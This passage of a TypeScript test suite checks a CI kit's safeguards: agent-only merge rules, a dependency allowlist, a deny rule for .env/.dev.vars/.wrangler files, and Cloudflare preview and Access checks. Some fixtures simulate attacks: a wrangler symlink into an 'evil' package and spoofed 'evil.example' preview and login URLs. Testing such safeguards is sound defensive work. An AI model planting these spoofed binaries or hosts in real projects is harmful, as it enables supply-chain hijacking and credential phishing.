  files?: (string | { filename: string; previous_filename: string })[];
}

function merge(c: MergeCase) {
  const author = c.author ?? 'site-agent';
  const state: FakeState = {
    heads: { 'o:agent/x': [{ number: 7 }] },
    pulls: { 7: { state: 'open', draft: false, head: { sha: 'abc' }, base: { ref: 'main' }, user: { login: author } } },
    commits: { 7: (c.commits ?? [author]).map((login) => ({ author: login === null ? null : { login } })) },
    files: {
      7: (c.files ?? ['src/pages/index.astro']).map((file) => (typeof file === 'string' ? { filename: file } : file)),
    },
    runs: { abc: (c.runs ?? [author]).map((login) => ({ actor: { login } })) },
  };
  const env: Record<string, string> = { KIT_AGENTS: '["site-agent","other-agent"]', TESTED_SHA: 'abc' };
  if (c.pr === undefined) env.BRANCH = 'agent/x';
  else env.PR = c.pr;
  if (c.actor !== undefined) env.ACTOR = c.actor;
  return github(MERGE_SCRIPT, state, env);
}

const MERGED = 'merge pr merge 7 --repo o/r --squash --delete-branch --match-head-commit abc';
const DISPATCHED = 'dispatch workflow run site.yml --repo o/r --ref main';

test('merge passes the pusher of the push run as ACTOR, and merge-event reads the pushers from the API', () => {
  assert.equal(runOf('merge', 'Merge the tested head'), `${MERGE_SCRIPT}\n`);
  assert.equal(runOf('merge-event', 'Merge the tested head'), `${MERGE_SCRIPT}\n`);
  assert.equal(step('merge', 'Merge the tested head').env?.ACTOR, expression('github.actor'));
  assert.equal(step('merge-event', 'Merge the tested head').env?.ACTOR, undefined);
});

test('the merge script merges an agent pull request that agents pushed and wrote, from both jobs', () => {
  const pushed = merge({ actor: 'site-agent' });
  assert.equal(pushed.status, 0, pushed.out);
  assert.deepEqual(pushed.calls, [MERGED, DISPATCHED], pushed.out);
  const event = merge({ pr: '7', runs: ['site-agent', 'other-agent'], commits: ['site-agent', 'other-agent'] });
  assert.deepEqual(event.calls, [MERGED, DISPATCHED], event.out);
});

test('the merge script leaves a pull request onto which a person who is not an agent pushed', () => {
  const pushed = merge({ actor: 'contractor-not-agent' });
  assert.equal(pushed.status, 0, pushed.out);
  assert.match(pushed.out, /the tested head was not pushed by an agent account/);
  assert.deepEqual(pushed.calls, []);
  for (const runs of [['contractor-not-agent'], ['site-agent', 'contractor-not-agent'], []]) {
    const event = merge({ pr: '7', runs });
    assert.match(event.out, /the tested head was not pushed by an agent account/, runs.join());
    assert.deepEqual(event.calls, [], runs.join());
  }
});

test('the merge script leaves a pull request with a commit of a person who is not an agent, or of no account', () => {
  for (const commits of [['site-agent', 'contractor-not-agent'], ['site-agent', null], ['dependabot[bot]']]) {
    const result = merge({ actor: 'site-agent', commits });
    assert.equal(result.status, 0, result.out);
    assert.match(result.out, /a commit has an author that is not an agent account/, String(commits));
    assert.deepEqual(result.calls, [], String(commits));
  }
});

test('a Dependabot pull request merges after the owner approves it: its pusher and commits are Dependabot', () => {
  const approved = merge({ pr: '7', author: 'dependabot[bot]', files: ['package.json', 'package-lock.json'] });
  assert.equal(approved.status, 0, approved.out);
  assert.deepEqual(approved.calls, [MERGED, DISPATCHED], approved.out);
  assert.equal(SPEC.includes('a Dependabot pull request merges after the owner approves it'), true);
  // A person who pushes onto the Dependabot branch is still not Dependabot.
  const pushed = merge({ pr: '7', author: 'dependabot[bot]', runs: ['dependabot[bot]', 'contractor-not-agent'] });
  assert.deepEqual(pushed.calls, []);
});

test('the file rule of the merge script covers .env*, .dev.vars* and .wrangler/ at any depth, renamed ones too', () => {
  for (const file of [...FORBIDDEN, { filename: 'docs/old.txt', previous_filename: '.env' }]) {
    const result = merge({ actor: 'site-agent', files: ['src/a.ts', file] });
    assert.match(result.out, /it changes a protected file/, JSON.stringify(file));
    assert.deepEqual(result.calls, [], JSON.stringify(file));
  }
  const similar = merge({
    actor: 'site-agent',
    files: ['docs/environment.md', 'src/env.ts', 'src/wrangler/x.ts', 'src/dev.vars.ts'],
  });
  assert.deepEqual(similar.calls, [MERGED, DISPATCHED], similar.out);
});

// The checkout check

/** The checkout check of 10.1; read when a test runs. */
const checkoutBlock = (): string => specBlock('- **The checkout check.**', 'sh');
const SECRET_JOBS = ['preview', 'deploy', 'smoke', 'rollback', 'feedback'];

test('every job that holds a secret checks its checkout after the install and before the first step with a secret', () => {
  for (const id of SECRET_JOBS) {
    const steps = job(id).steps;
    const at = steps.findIndex((entry) => entry.name === 'Check the checkout');
    assert.equal(steps[at]?.run, `${checkoutBlock()}\n`, id);
    assert.equal(steps[at - 1]?.name, 'Check the installed tree', id);
    const secret = steps.findIndex(
      (entry, index) =>
        index > 0 && JSON.stringify(entry.env ?? {}).includes('secrets.') && entry.name !== 'The feedback token',
    );
    assert.ok(at < secret, `${id}: the check comes before ${steps[secret]?.name}`);
  }
  // The allowlist of the step is the allowlist of config-dep-allowlist.
  const names = (list: readonly string[]) => list.map((name) => `"${name}"`).join(', ');
  assert.equal(checkoutBlock().includes(`[${names(BASE_DEPENDENCIES)}]`), true);
  assert.equal(checkoutBlock().includes(`then [${names(FORMS_DEPENDENCIES)}]`), true);
  assert.equal(checkoutBlock().includes(`then [${names(ISLANDS_DEPENDENCIES)}]`), true);
  assert.equal(job('feedback').needs, 'ci');
});

interface Checkout {
  pkg?: unknown;
  settings?: unknown;
  /** The astro-kit.json of the branch, when it differs from main. */
  branchSettings?: unknown;
  files?: Record<string, string>;
  wranglerBin?: string;
}

function checkout(c: Checkout) {
  return scratch({}, (work, env) => {
    const git = (...args: string[]) =>
      spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@e', ...args], { cwd: work, encoding: 'utf8' });
    const write = (path: string, text: string) => {
      mkdirSync(dirname(join(work, path)), { recursive: true });
      writeFileSync(join(work, path), text);
    };
    write(
      'package.json',
      JSON.stringify(c.pkg ?? { dependencies: { astro: '7.4.13' }, devDependencies: { wrangler: '4.165.0' } }),
    );
    write(
      'astro-kit.json',
      JSON.stringify(c.settings ?? { features: { forms: false, islands: false }, dependencies: [] }),
    );
    git('init', '-q', '-b', 'main');
    git('add', '-A');
    git('commit', '-q', '-m', 'main');
    git('update-ref', 'refs/remotes/origin/main', 'HEAD');
    if (c.branchSettings !== undefined) write('astro-kit.json', JSON.stringify(c.branchSettings));
    for (const [path, text] of Object.entries(c.files ?? {})) write(path, text);
    write('node_modules/wrangler/bin/wrangler.js', '');
    write('node_modules/@raess/astro-kit/dist/cli.js', '');
    write('node_modules/evil/bin/wrangler.js', '');
    mkdirSync(join(work, 'node_modules/.bin'));
    symlinkSync(c.wranglerBin ?? '../wrangler/bin/wrangler.js', join(work, 'node_modules/.bin/wrangler'));
    symlinkSync('../@raess/astro-kit/dist/cli.js', join(work, 'node_modules/.bin/astro-kit'));
    const result = bash(checkoutBlock(), work, env);
    return { status: result.status, out: `${result.stdout}${result.stderr}` };
  });
}

test('the checkout check passes the dependencies of the allowlist, with the settings of main', () => {
  assert.deepEqual(checkout({}), { status: 0, out: '' });
  const forms = checkout({
    pkg: { dependencies: { astro: '7', '@astrojs/cloudflare': '14', '@raess/astro-kit': '1.0.0', leaflet: '1' } },
    settings: { features: { forms: true }, dependencies: ['leaflet'] },
  });
  assert.deepEqual(forms, { status: 0, out: '' });
  // A .env inside node_modules is a file of a package, not of the checkout.
  assert.equal(checkout({ files: { 'node_modules/x/.env': 'X=1' } }).status, 0);
});

test('the checkout check fails a dependency off the allowlist, also when the branch widens its own settings', () => {
  const message = '::error::package.json has a direct dependency that is not on the allowlist of the kit\n';
  const cases: [string, Checkout][] = [
    ['an unknown package', { pkg: { devDependencies: { wrangler: '4', 'left-pad': '1' } } }],
    ['a peer dependency', { pkg: { peerDependencies: { 'left-pad': '1' } } }],
    ['the forms adapter without forms', { pkg: { dependencies: { '@astrojs/cloudflare': '14' } } }],
    ['a section that is a list', { pkg: { dependencies: ['astro'] } }],
    [
      'settings that the branch widened',
      {
        pkg: { dependencies: { astro: '7', 'left-pad': '1' } },
        branchSettings: { features: { forms: false }, dependencies: ['left-pad'] },
      },
    ],
  ];
  for (const [name, c] of cases) assert.deepEqual(checkout(c), { status: 1, out: message }, name);
});

test('the checkout check fails a .env, .dev.vars or .wrangler file at any depth, and a wrangler bin of another package', () => {
  const files = '::error::the checkout holds a .env, .dev.vars or .wrangler file, which wrangler would read\n';
  for (const path of FORBIDDEN) {
    assert.deepEqual(checkout({ files: { [path]: 'X=1' } }), { status: 1, out: files }, path);
  }
  assert.deepEqual(checkout({ wranglerBin: '../evil/bin/wrangler.js' }), {
    status: 1,
    out: '::error::node_modules/.bin/wrangler is not the bin of its own package\n',
  });
});

// The preview steps and the protected task, under bash

test('the preview upload gives the URL of the alias, and fails when wrangler prints none', () => {
  const upload = runOf('preview', 'Upload the preview version');
  const run = (printed: string, withConfig: boolean) =>
    scratch({ npx: `echo "npx $*" >> "$LOG"; printf '%s\\n' '${printed}'\n` }, (work, env) => {
      if (withConfig) {
        mkdirSync(join(work, 'dist/server'), { recursive: true });
        writeFileSync(join(work, 'dist/server/wrangler.json'), '{}');
      }
      const result = bash(upload, work, { ...env, ALIAS: 'b-0123456789', BRANCH: 'agent/x', SHA: 'abc' });
      const output = existsSync(env.GITHUB_OUTPUT ?? '') ? readFileSync(env.GITHUB_OUTPUT ?? '', 'utf8') : '';
      return { result, output, calls: lines(env.LOG ?? ''), temp: env.RUNNER_TEMP ?? '' };
    });
  const url = 'https://b-0123456789-example-ch-preview.acct.workers.dev';
  const ok = run(`Version Preview Alias URL: ${url}`, false);
  assert.equal(ok.result.status, 0, ok.result.stderr);
  assert.equal(ok.output, `url=${url}\n`);
  assert.deepEqual(ok.calls, [
    `npx --no wrangler versions upload --config wrangler.jsonc --env preview --preview-alias b-0123456789 --message agent/x abc --env-file ${ok.temp}/empty.env`,
  ]);
  const forms = run(`Version Preview Alias URL: ${url}`, true);
  assert.deepEqual(forms.calls, [
    `npx --no wrangler versions upload --config dist/server/wrangler.json --preview-alias b-0123456789 --message agent/x abc --env-file ${forms.temp}/empty.env`,
  ]);
  for (const printed of [
    'Uploaded',
    'https://b-9999999999-example-ch-preview.acct.workers.dev',
    'https://b-0123456789-x.evil.example',
  ]) {
    const none = run(printed, false);
    assert.equal(none.result.status, 1, printed);
    assert.equal(none.result.stdout.endsWith('::error::the upload printed no preview URL\n'), true, printed);
    assert.equal(none.output, '', printed);
  }
});

test('the preview must answer with a redirect to a Cloudflare Access login', () => {
  const access = runOf('preview', 'The preview is behind Cloudflare Access');
  const url = 'https://b-0123456789-example-ch-preview.acct.workers.dev';
  const run = (headers: string, status = 0) =>
    scratch({ curl: `echo "curl $*" >> "$LOG"; printf '${headers}'; exit ${status}\n` }, (work, env) => {
      const result = bash(access, work, { ...env, URL: url });
      return { status: result.status, out: result.stdout, calls: lines(env.LOG ?? '') };
    });
  const ok = run('HTTP/2 302\\r\\nlocation: https://team.cloudflareaccess.com/cdn-cgi/access/login\\r\\n');
  assert.equal(ok.status, 0);
  assert.deepEqual(ok.calls, [`curl -sSI ${url}`]);
  const message = `::error::${url} answers without an Access login; protect the preview Worker with Cloudflare Access\n`;
  for (const [headers, status] of [
    ['HTTP/2 200\\r\\ncontent-type: text/html\\r\\n', 0],
    ['HTTP/2 302\\r\\nlocation: https://evil.example/cloudflareaccess.com/\\r\\n', 0],
    ['HTTP/2 302\\r\\nx-location: https://team.cloudflareaccess.com/\\r\\n', 0],
    ['', 7],
  ] as const) {
    assert.deepEqual(run(headers, status), { status: 1, out: message, calls: [`curl -sSI ${url}`] }, headers);
  }
});

test('the protected task pushes to the branch, or to kit/protected with one pull request, against a bare remote', () => {
  const push = runOf('protected', 'Push the protected files');
  const run = (target: string, open: string) =>
    scratch({ gh: `echo "gh $*" >> "$LOG"; [ "$2" = list ] && echo '${open}'; exit 0\n` }, (work, env) => {
      const remote = join(dirname(work), 'remote.git');
      const git = (cwd: string, ...args: string[]) =>
        spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@e', ...args], { cwd, encoding: 'utf8' });
      git(dirname(work), 'init', '-q', '--bare', '-b', 'main', remote);
      git(work, 'init', '-q', '-b', 'main');
      writeFileSync(join(work, 'a.txt'), 'old\n');
      git(work, 'add', '-A');
      git(work, 'commit', '-q', '-m', 'main');
      git(work, 'remote', 'add', 'origin', remote);
      git(work, 'push', '-q', 'origin', 'main', 'main:agent/x');
      writeFileSync(join(work, 'a.txt'), 'rendered\n');
      const result = bash(push, work, { ...env, BRANCH: target, REPO: 'o/r', GH_TOKEN: 'x' });
      const heads = Object.fromEntries(
        ['main', 'agent/x', 'kit/protected'].map((ref) => [
          ref,
          git(remote, 'log', '-1', '--format=%s %an', ref).stdout.trim(),
        ]),
      );
      return { status: result.status, out: result.stdout + result.stderr, calls: lines(env.LOG ?? ''), heads };
    });
  const branch = run('agent/x', '0');
  assert.equal(branch.status, 0, branch.out);
  assert.equal(branch.heads['agent/x'], 'chore: render the protected files github-actions[bot]');
  assert.deepEqual(branch.calls, []);
  const main = run('', '0');
  assert.equal(main.status, 0, main.out);
  assert.equal(main.heads['kit/protected'], 'chore: render the protected files github-actions[bot]');
  assert.equal(main.heads.main, 'main t');
  assert.equal(branch.heads['kit/protected'], '', 'a push to a branch leaves kit/protected');
  assert.deepEqual(main.calls, [
    'gh pr list --repo o/r --head kit/protected --state open --json number --jq length',
    'gh pr create --repo o/r --base main --head kit/protected --title Render the protected files --body Rendered by the protected task.',
  ]);
  const again = run('', '1');
  assert.deepEqual(again.calls, ['gh pr list --repo o/r --head kit/protected --state open --json number --jq length']);
});

test('the protected task installs only the kit with a fresh, empty cache, and removes the cache whatever npm does', () => {
  const install = runOf('protected', 'Install only the kit, outside the checkout');
  for (const status of [0, 1]) {
    const npm = `c=''; for a in "$@"; do [ -n "$next" ] && c=$a; next=; [ "$a" = --cache ] && next=1; done
echo "$* | empty=$([ -d "$c" ] && [ -z "$(ls -A "$c")" ] && echo yes)" >> "$LOG"; echo "$c" >> "$LOG.cache"; touch "$c/x"; exit ${status}
`;
    scratch({ npm }, (work, env) => {
      writeFileSync(
        join(work, 'package-lock.json'),
        JSON.stringify({ packages: { 'node_modules/@raess/astro-kit': { version: '1.2.3' } } }),
      );
      const result = bash(install, work, env);
      assert.equal(result.status, status, result.stderr);
      const [call] = lines(env.LOG ?? '');
      assert.match(
        call ?? '',
        /^install --prefix \S+\/kit .* --cache \S+ --save-exact @raess\/astro-kit@1\.2\.3 \| empty=yes$/,
      );
      const [cache] = lines(`${env.LOG}.cache`);
      assert.equal(existsSync(cache ?? ''), false, 'the cache folder is removed');
    });
  }
});

// config-shim on the YAML files and CODEOWNERS (10.6)

const OWNER = { codeOwner: '@example-owner' };

function protectedFindings(files: Record<string, string>, options: { codeOwner: string } | undefined): string[] {
  return inTemp({ ...renderProtected(OWNER), ...files }, (root) => {
    const report = new Report();
    checkProtectedFiles(root, options, report);
    return report.findings.map((finding) => `${finding.where}: ${finding.detail}`);
  });
}

test('config-shim compares site.yml, site-merge.yml and dependabot.yml byte for byte: stale text or CRLF fails', () => {
  const rendered = renderProtected(OWNER);
  for (const file of [SITE_WORKFLOW_FILE, SITE_MERGE_FILE, DEPENDABOT_FILE]) {
    const text = rendered[file] ?? '';
    const stale = protectedFindings(
      { [file]: text.replace('set -euo pipefail', 'set -eu').replace('version: 2', 'version: 3') },
      OWNER,
    );
    assert.equal(stale.length, 1, file);
    assert.match(stale[0] ?? '', new RegExp(`^${file.replaceAll('.', '\\.')}:\\d+: the kit's rendering has `), file);
    assert.deepEqual(
      protectedFindings({ [file]: text.replaceAll('\n', '\r\n') }, OWNER),
      [`${file}: the kit's rendering has LF line ends and ends with one newline, byte for byte`],
      file,
    );
    // The five files that depend on no setting are compared without valid settings too.
    assert.deepEqual(protectedFindings({ [file]: `${text}\n` }, undefined), [
      `${file}: the kit's rendering has LF line ends and ends with one newline, byte for byte`,
    ]);
  }
});

test('config-shim compares CODEOWNERS for the code owner, and only its presence without valid settings', () => {
  const other = renderCodeOwners('@someone-else');
  assert.deepEqual(protectedFindings({ [CODEOWNERS_FILE]: other }, OWNER), [
    `${CODEOWNERS_FILE}:2: the kit's rendering has \`/astro-kit.json @example-owner\` here`,
  ]);
  assert.deepEqual(protectedFindings({ [CODEOWNERS_FILE]: other }, undefined), []);
  assert.deepEqual(protectedFindings({ [CODEOWNERS_FILE]: 'anything\n' }, undefined), []);
  const missing = inTemp({}, (root) => {
    const report = new Report();
    checkProtectedFiles(root, undefined, report);
    return report.findings.map((finding) => `${finding.where}: ${finding.detail}`);
  });
  assert.equal(missing.includes(`${CODEOWNERS_FILE}: the file is missing`), true);
});

// The specification

test('the deploy steps read the config as $CONFIG, as the spec writes it', () => {
  assert.equal(SPEC.includes('--config "$config"'), false);
  assert.equal(
    SPEC.includes(
      '`npx --no wrangler versions upload --config "$CONFIG" --message "main $SHA" --env-file "$RUNNER_TEMP/empty.env" | tee upload.log`',
    ),
    true,
  );
  assert.match(runOf('deploy', 'Upload the version'), /--config "\$CONFIG"/);
  assert.match(runOf('deploy', 'Deploy the version'), /--config "\$CONFIG"/);
});
